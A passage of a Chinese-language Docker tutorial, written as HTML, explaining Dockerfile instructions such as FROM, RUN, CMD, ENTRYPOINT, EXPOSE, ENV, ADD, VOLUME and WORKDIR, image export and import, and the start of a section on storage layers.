&#x3002;</code></pre><ul><li>-t&#x6307;&#x5B9A;repository&#x4E0E;tag</li><li>.&#x6307;&#x5B9A;Dockerfile&#x7684;&#x8DEF;&#x5F84;</li></ul><p>&#x6CE8;&#x610F;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x4E0D;&#x80FD;&#x8D85;&#x8FC7;127&#x5C42;</p><p>&#x6B64;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;ADD&#x547D;&#x4EE4;&#x590D;&#x5236;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5230;&#x955C;&#x50CF;&#xFF1B;<br>&#x7528;EXPOSE&#x547D;&#x4EE4;&#x6765;&#x5411;&#x5916;&#x90E8;&#x5F00;&#x653E;&#x7AEF;&#x53E3;&#xFF1B;<br>&#x7528;CMD&#x547D;&#x4EE4;&#x6765;&#x63CF;&#x8FF0;&#x5BB9;&#x5668;&#x542F;&#x52A8;&#x540E;&#x8FD0;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#x7B49;&#x3002;<br>CMD [&#x201C;/usr/sbin/apachectl&#x201D;, &#x201C;-D&#x201D;, &#x201C;FOREGROUND&#x201D;]</p><p><strong>2.6 Docker&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</strong></p><p>Dockerfile&#x7684;&#x6307;&#x4EE4;&#x6839;&#x636E;&#x4F5C;&#x7528;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF0C;&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#x548C;&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#x3002;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x6784;&#x5EFA;image&#xFF0C;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x518D;&#x8FD0;&#x884C;image&#x7684;&#x5BB9;&#x5668;&#x4E0A;&#x6267;&#x884C;&#xFF1B;<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;image&#x5C5E;&#x6027;&#xFF0C;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x5C06;&#x5728;&#x8FD0;&#x884C;image&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#x6267;&#x884C;&#x3002;</p><ul><li>FROM &#xFF08;&#x6307;&#x5B9A;&#x57FA;&#x7840;image&#xFF09;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x4E14;&#x9700;&#x8981;&#x5728;Dockerfile&#x5176;&#x4ED6;&#x6307;&#x4EE4;&#x7684;&#x524D;&#x9762;&#x3002;&#x540E;&#x7EED;&#x7684;&#x6307;&#x4EE4;&#x7248;&#x672C;&#x90FD;&#x4F9D;&#x8D56;&#x4E8E;&#x8BE5;&#x6307;&#x4EE4;&#x7684;image&#x3002;<br>FROM&#x6307;&#x4EE4;&#x6307;&#x5B9A;&#x7684;&#x57FA;&#x7840;image&#x53EF;&#x4EE5;&#x662F;&#x5B98;&#x65B9;&#x8FDC;&#x7A0B;&#x4ED3;&#x5E93;&#x4E2D;&#x7684;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F4D;&#x4E8E;&#x672C;&#x5730;&#x4ED3;&#x5E93;</li></ul><p>&#x8BE5;&#x6307;&#x4EE4;&#x6709;&#x4E24;&#x79CD;&#x683C;&#x5F0F;&#xFF1A;</p><pre><code class="dockerfile">FROM &lt;iamge&gt;        # &#x6307;&#x5B9A;&#x57FA;&#x7840;image&#x4E3A;&#x8BE5;image&#x7684;&#x6700;&#x540E;&#x4FEE;&#x6539;&#x7248;&#x672C;FROM &lt;image&gt;:&lt;tag&gt;  # &#x6307;&#x5B9A;&#x57FA;&#x7840;&#x4E3A;&#x8BE5;image&#x7684;&#x4E00;&#x4E2A;tag&#x7248;&#x672C;</code></pre><ul><li><p>MAINTAINER&#xFF08;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x955C;&#x50CF;&#x521B;&#x5EFA;&#x8005;&#x4FE1;&#x606F;&#xFF09;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x5C06;image&#x7684;&#x5236;&#x4F5C;&#x8005;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x5199;&#x5165;&#x5230;image&#x4E2D;&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x5BF9;&#x8BE5;image&#x6267;&#x884C;docker inspect&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x8F93;&#x51FA;&#x4E2D;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x5B57;&#x6BB5;&#x8BB0;&#x5F55;&#x8BE5;&#x4FE1;&#x606F;&#x3002;</p><p>  MAINTAINER <name></name></p></li><li><p>RUN(&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x7528;)<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;RUN&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x4EFB;&#x4F55;&#x88AB;&#x57FA;&#x7840;image&#x652F;&#x6301;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x5982;&#x57FA;&#x7840;image&#x9009;&#x62E9;&#x4E86;ubuntu&#xFF0C;&#x90A3;&#x4E48;&#x8F6F;&#x4EF6;&#x7BA1;&#x7406;&#x90E8;&#x5206;&#x53EA;&#x80FD;&#x4F7F;&#x7528;ubuntu&#x7684;&#x547D;&#x4EE4;&#x3002;</p><pre><code class="dockerfile">RUN &lt;command&gt; (the command is run in a shell - `/bin/sh -c`)RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot; ...] (exec form)</code></pre></li><li><p>CMD(&#x8BBE;&#x7F6E;container&#x542F;&#x52A8;&#x65F6;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;)<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;container&#x542F;&#x52A8;&#x65F6;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x8BE5;&#x64CD;&#x4F5C;&#x53EF;&#x4EE5;&#x662F;&#x6267;&#x884C;&#x81EA;&#x5B9A;&#x4E49;&#x811A;&#x672C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;&#x8BE5;&#x6307;&#x4EE4;&#x53EA;&#x80FD;&#x5728;&#x6587;&#x4EF6;&#x4E2D;&#x7EA2;&#x5B58;&#x5728;&#x4E00;&#x6B21;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#xFF0C;&#x5219;&#x6267;&#x884C;&#x6700;&#x540E;&#x4E00;&#x6761;&#x3002;</p><pre><code class="dockerfile">CMD [&quot;executablel&quot;, &quot;param1&quot;, &quot;param2&quot;] (like an exec, this is the preferred form)CMD command param1 para2 (as a shell)</code></pre></li></ul><p>ENTRYPOINT&#x6307;&#x5B9A;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x6267;&#x884C;&#x811A;&#x672C;&#x6216;&#x8005;&#x7A0B;&#x5E8F;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x8BE5;&#x6307;&#x5B9A;&#x7684;&#x811A;&#x672C;&#x6216;&#x8005;&#x7A0B;&#x5E8F;&#x5C06;&#x4F1A;&#x4EE5;param1&#x548C;param2&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#x5982;&#x679C;CMD&#x6307;&#x4EE4;&#x4F7F;&#x7528;&#x4E0A;&#x9762;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;Dockerfile&#x4E2D;&#x5FC5;&#x987B;&#x8981;&#x6709;&#x914D;&#x5957;&#x7684;ENTRYPOINT&#x3002;&#x5F53;Dockerfile&#x5236;&#x5B9A;&#x4E86;ENTRYPOINT&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x683C;&#x5F0F;&#xFF1A;</p><pre><code class="dockerfile">CMD [&quot;param1&quot;, &quot;param2&quot;] (as defualt paramenters to ENTRYPOINT)</code></pre><ul><li>ENTRYPOINT&#xFF0C;&#x6307;&#x5B9A;&#x5BB9;&#x5668;&#x542F;&#x52A8;&#x65F6;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x8BBE;&#x7F6E;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6709;&#x6548;&#x3002;</li></ul><pre><code class="dockerfile">ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;](like an exec, the preferred fomr)ENTRYPOINT command param1 param2 (as a shell)</code></pre><p>&#x8BE5;&#x6307;&#x4EE4;&#x7684;&#x4F7F;&#x7528;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x72EC;&#x81EA;&#x4F7F;&#x7528;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x548C;CMD&#x914D;&#x5408;&#x4F7F;&#x7528;&#x3002;<br>&#x5F53;&#x72EC;&#x81EA;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x4F7F;&#x7528;&#x4E86;CMD&#x547D;&#x4EE4;&#x4E14;CMD&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x53EF;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;CMD&#x6307;&#x4EE4;&#x548C;ENTRYPOINT&#x4F1A;&#x76F8;&#x4E92;&#x8986;&#x76D6;&#x53EA;&#x6709;&#x6700;&#x540E;&#x4E00;&#x4E2A;CMD&#x6216;&#x8005;ENTRYPINT&#x6709;&#x6548;&#x3002;</p><pre><code class="dockerfile"># CMD&#x6307;&#x4EE4;&#x5C06;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x53EA;&#x6709;ENTRYPOINT&#x6307;&#x4EE4;&#x88AB;&#x6267;&#x884C;CMD echo &quot;Hello, World!&quot;ENTRYPOINT ls -l</code></pre><p>&#x53E6;&#x4E00;&#x79CD;&#x7528;&#x6CD5;&#x548C;CMD&#x6307;&#x4EE4;&#x914D;&#x5408;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;ENTRYPIINT&#x7684;&#x9ED8;&#x8BA4;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x65F6;CMD&#x6307;&#x4EE4;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x53EF;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x4EC5;&#x4EC5;&#x662F;&#x53C2;&#x6570;&#x90E8;&#x5206;&#xFF1B;ENTRYPOINT&#x6307;&#x4EE4;&#x53EA;&#x80FD;&#x4F7F;&#x7528;JSON&#x65B9;&#x5F0F;&#x6307;&#x5B9A;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;&#x53C2;&#x6570;&#x3002;</p><pre><code class="dockerfile">FROM ubuntuCMD [&quot;-l&quot;]ENTRYPOINT [&quot;/usr/bin/ls&quot;]</code></pre><ul><li><p>USER&#xFF08;&#x8BBE;&#x7F6E;container&#x5BB9;&#x5668;&#x7684;&#x7528;&#x6237;&#xFF09;<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x8BBE;&#x7F6E;&#x542F;&#x52A8;&#x5BB9;&#x5668;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;root&#x7528;&#x6237;</p><pre><code class="dockerfile"># &#x6307;&#x5B9A;memcached&#x7684;&#x8FD0;&#x884C;&#x7528;&#x6237;ENTRYPOINT [&quot;memcached&quot;]USER daemon&#x6216;ENTRYPOINT [&quot;memcached&quot;, &quot;-u&quot;, &quot;daemon&quot;]</code></pre></li><li><p>EXPOSE&#xFF08;&#x6307;&#x5B9A;&#x5BB9;&#x5668;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#xFF09;</p></li></ul><p>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x8BE5;&#x6307;&#x4EE4;&#x4F1A;&#x5C06;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x6210;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;&#x3002;&#x5F53;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x662F;&#x7528;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x548C;&#x6620;&#x5C04;&#x540E;&#x7684;&#x7AEF;&#x53E3;&#x3002;&#x8981;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x64CD;&#x4F5C;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x9996;&#x5148;&#x5728;Dockerfile&#x4F7F;&#x7528;EXPOSE&#x8BBE;&#x7F6E;&#x9700;&#x8981;&#x6620;&#x5C04;&#x7684;&#x5BB9;&#x5668;&#x7AEF;&#x53E3;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;-p&#x9009;&#x9879;&#x52A0;&#x4E0A;EXPOSE&#x8BBE;&#x7F6E;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x8FD9;&#x6837;EXPOSE&#x8BBE;&#x7F6E;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4F1A;&#x88AB;&#x968F;&#x673A;&#x6620;&#x5C04;&#x6210;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x90A3;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x8FD9;&#x65F6;&#x8981;&#x786E;&#x4FDD;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x6CA1;&#x6709;&#x88AB;&#x4F7F;&#x7528;&#x3002;EXPOSE&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x54CD;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x914D;&#x5957;&#x7684;&#x591A;&#x6B21;&#x4F7F;&#x7528;-p&#x9009;&#x9879;&#x3002;</p><pre><code class="dockerfile"># &#x6620;&#x5C04;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;EXPOSE port1# &#x76F8;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#xFF08;&#x4E3B;&#x673A;&#xFF08;&#x7AEF;&#x53E3;&#xFF09;&#x7AEF;&#x53E3;&#xFF1A;&#x5BB9;&#x5668;&#x7AEF;&#x53E3;&#xFF09;docker run -p port image# &#x6620;&#x5C04;&#x591A;&#x4E2A;&#x7AEF;&#x53E3;EXPOSE port1 port2 port3# &#x76F8;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;docker run -p port1 -p port2 -p port3 image#&#x8FD8;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;docker run -p host_port1:port1 -p host_port2:port2 -p host_port3:port3 image</code></pre><p>&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x662F;docker&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;&#x800C;&#x662F;&#x5728;&#x6865;&#x63A5;&#x7F51;&#x5361;&#x7684;&#x5730;&#x5740;&#x8303;&#x56F4;&#x5185;&#x968F;&#x673A;&#x751F;&#x6210;&#x7684;&#x3002;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x5BB9;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x514D;&#x53BB;&#x6BCF;&#x6B21;&#x8BBF;&#x95EE;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x65F6;&#x90FD;&#x8981;&#x67E5;&#x770B;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x3002;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;docker port&#x52A0;&#x4E0A;&#x5BB9;&#x5668;&#x4E2D;&#x9700;&#x8981;&#x6620;&#x5C04;&#x7684;&#x7AEF;&#x53E3;&#x548C;&#x5BB9;&#x5668;&#x7684;ID&#x6765;&#x67E5;&#x770B;&#x8BE5;&#x7AEF;&#x53E3;&#x53F7;&#x5728;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x6620;&#x5C04;&#x7AEF;&#x53E3;&#x3002;</p><ul><li>ENV&#xFF08;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x5728;image&#x4E2D;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;<pre><code class="dockerfile">ENV &lt;key&gt; &lt;value&gt;</code></pre></li></ul><p>&#x8BBE;&#x7F6E;&#x4E86;&#x540E;&#xFF0C;&#x540E;&#x7EED;&#x7684;RUN&#x547D;&#x4EE4;&#x90FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;container&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;docker inspect&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;docker run &#x2013;env key=value&#x65F6;&#x8BBE;&#x7F6E;&#x6216;&#x4FEE;&#x6539;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;<br>&#x5047;&#x5982;&#x4F60;&#x5B89;&#x88C5;&#x4E86;JAVA&#x7A0B;&#x5E8F;&#xFF0C;&#x9700;&#x8981;&#x8BBE;&#x7F6E;JAVA_HOME&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5728;Dockerfile&#x4E2D;&#x8FD9;&#x6837;&#x5199;&#xFF1A;</p><pre><code class="dockerfile">ENV JAVA_HOME /path/to/java/dirent</code></pre><ul><li>ADD&#xFF08;&#x4ECE;src&#x590D;&#x5236;&#x6587;&#x4EF6;&#x5230;container&#x7684;dest&#x8DEF;&#x5F84;&#xFF09;</li></ul><p>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x6240;&#x6709;&#x62F7;&#x8D1D;&#x5230;container&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x6587;&#x4EF6;&#x5939;&#x6743;&#x9650;&#x4E3A;0755&#xFF0C;uid&#x548C;gid&#x4E3A;0&#xFF1B;&#x5982;&#x679C;&#x662F;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x5C06;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x6DFB;&#x52A0;&#x5230;container&#x4E2D;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x76EE;&#x5F55;&#xFF1B;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x662F;&#x53EF;&#x8BC6;&#x522B;&#x7684;&#x538B;&#x7F29;&#x683C;&#x5F0F;&#xFF0C;&#x5219;docker&#x4F1A;&#x5E2E;&#x5FD9;&#x89E3;&#x538B;&#x7F29;&#xFF08;&#x6CE8;&#x610F;&#x538B;&#x7F29;&#x683C;&#x5F0F;&#xFF09;&#xFF1B;&#x5982;&#x679C;\<src>&#x662F;&#x6587;&#x4EF6;&#x4E14;\<dest>&#x4E2D;&#x4E0D;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x7ED3;&#x675F;&#xFF0C;&#x5219;&#x4F1A;&#x5C06;\<dest>&#x89C6;&#x4E3A;&#x6587;&#x4EF6;&#xFF0C;\<src>&#x7684;&#x5185;&#x5BB9;&#x4F1A;&#x5199;&#x5165;\<dest>&#xFF1B;&#x5982;&#x679C;\<src>&#x662F;&#x6587;&#x4EF6;&#x4E14;\<dest>&#x4E2D;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x7ED3;&#x675F;&#xFF0C;&#x5219;&#x4F1A;\<src>&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x5230;\<dest>&#x76EE;&#x5F55;&#x4E0B;&#x3002;</dest></src></dest></src></dest></src></dest></dest></src></p><pre><code class="dockerfile">ADD &lt;src&gt; &lt;dest&gt;</code></pre><p><code>&lt;src&gt;</code>&#x662F;&#x76F8;&#x5BF9;&#x88AB;&#x6784;&#x5EFA;&#x7684;&#x6E90;&#x76EE;&#x5F55;&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x7684;&#x6587;&#x4EF6;url;<br><code>&lt;dest&gt;</code>&#x662F;container&#x4E2D;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</p><ul><li>VOLUME&#xFF08;&#x6307;&#x5B9A;&#x6302;&#x8F7D;&#x70B9;&#xFF09;</li></ul><p>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x4F7F;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x6301;&#x4E45;&#x5316;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8BE5;&#x76EE;&#x5F55;&#x53EF;&#x4EE5;&#x88AB;&#x5BB9;&#x5668;&#x672C;&#x8EAB;&#x4F7F;&#x7528;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5171;&#x4EAB;&#x7ED9;&#x5176;&#x4ED6;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x3002;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x662F;AUFS&#xFF0C;&#x8FD9;&#x79CD;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0D;&#x80FD;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x5F53;&#x5BB9;&#x5668;&#x5173;&#x95ED;&#x540E;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x66F4;&#x6539;&#x90FD;&#x4F1A;&#x4E22;&#x5931;&#x3002;&#x5F53;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x6709;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#x7684;&#x9700;&#x6C42;&#x65F6;&#x53EF;&#x4EE5;&#x5728;Dockerfile&#x4E2D;&#x4F7F;&#x7528;&#x8BE5;&#x6307;&#x4EE4;&#x3002;</p><pre><code class="dockerfile">FROM baseVOLUME [&quot;/tmp/data&quot;]</code></pre><ul><li>WORKDIR&#xFF08;&#x5207;&#x6362;&#x76EE;&#x5F55;&#xFF09;<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x5207;&#x6362;&#xFF08;&#x76F8;&#x5F53;&#x4E8E;cd&#x547D;&#x4EE4;&#xFF0C;&#x5BF9;RUN,CMD,ENTRYPOINT&#x751F;&#x6548;<pre><code class="dockerfile"># &#x5728; /p1/p2&#x4E0B;&#x6267;&#x884C; vim a.txtWORKDIR /p1 WORKDIR p2 RUN vim a.txt</code></pre></li></ul><p><strong>2.7 &#x955C;&#x50CF;&#x5BFC;&#x5165;&#x5BFC;&#x51FA;</strong></p><pre><code class="shell">docker save -o centos6.5.tar centos6.5 # &#x6216;docker export f9c99092063c &gt; centos6.5.tar</code></pre><p>&#x5C06;&#x672C;&#x5730;&#x955C;&#x50CF;&#x5BFC;&#x5165;</p><pre><code class="shell">docker load --input cnetos6.5.tar #&#x6216;docker load &lt; centos6.5.tar</code></pre><pre><code class="shell">docker exec -it CONTAINER ID /bin/bash</code></pre><h2 id="&#x4E09;&#x3001;&#x5B58;&#x50A8;"><a href="#&#x4E09;&#x3001;&#x5B58;&#x50A8;" class="headerlink" title="&#x4E09;&#x3001;&#x5B58;&#x50A8;"></a>&#x4E09;&#x3001;&#x5B58;&#x50A8;</h2><p><strong>3.1 &#x6570;&#x636E;&#x76D8;</strong></p><p>docker&#x7684;&#x955C;&#x50CF;&#x4F7F;&#x7528;&#x4E00;&#x5C42;&#x4E00;&#x5C42;&#x6587;&#x4EF6;&#x7EC4;&#x6210;&#x7684;&#xFF0C;docker&#x7684;&#x4E00;&#x4E9B;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x53EF;&#x4EE5;&#x5904;&#x7406;&#x600E;&#x4E48;&#x6837;&#x5B58;&#x50A8;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x3002;</p><pre><code class="shell">docker inspect centos  # &#x67E5;&#x770B;&#x5BB9;&#x5668;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;</code></pre><p>&#x4FE1;&#x606F;&#x4E0B;&#x65B9;&#x7684;Layers&#xFF0C;&#x5C31;&#x662F;centos&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x90FD;&#x662F;&#x53EA;&#x8BFB;&#x7684;&#x4E0D;&#x80FD;&#x53BB;&#x4FEE;&#x6539;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x955C;&#x50CF;&#x53BB;&#x521B;&#x5EFA;&#x7684;&#x955C;&#x50CF;&#x548C;&#x5BB9;&#x5668;&#x4E5F;&#x4F1A;&#x5171;&#x4EAB;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x5C42;&#xFF0C;&#x800C;docker&#x4F1A;&#x5728;&#x8FD9;&#x4E9B;&#x5C42;&#x4E0A;&#x9762;&#x53BB;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x4E00;&#x4E9B;&#x6587;&#x4EF6;&#x5C42;&#x91CC;&#x9762;&#x7684;&#x4E1C;